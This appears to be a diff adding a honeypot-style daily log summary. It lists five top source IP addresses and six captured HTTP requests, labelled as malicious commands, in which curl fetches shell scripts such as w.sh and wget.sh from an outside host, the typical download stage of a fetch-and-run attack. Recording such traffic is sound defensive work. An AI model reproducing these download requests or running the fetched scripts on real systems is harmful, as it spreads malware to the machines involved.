@@ -1,0 +1,50 @@
+Top 5 IPs for 2024-01-14:
+
+113.25.218.152
+114.227.58.36
+121.231.202.113
+223.151.75.233
+211.107.124.218
+
+Malicious commands seen:
+GET /w.sh HTTP/1.1
+Host: 203.145.46.76
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /c.sh HTTP/1.1
+Host: 203.145.46.76
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 203.145.46.76
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 203.145.46.76
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 203.145.46.76
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 203.145.46.76
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
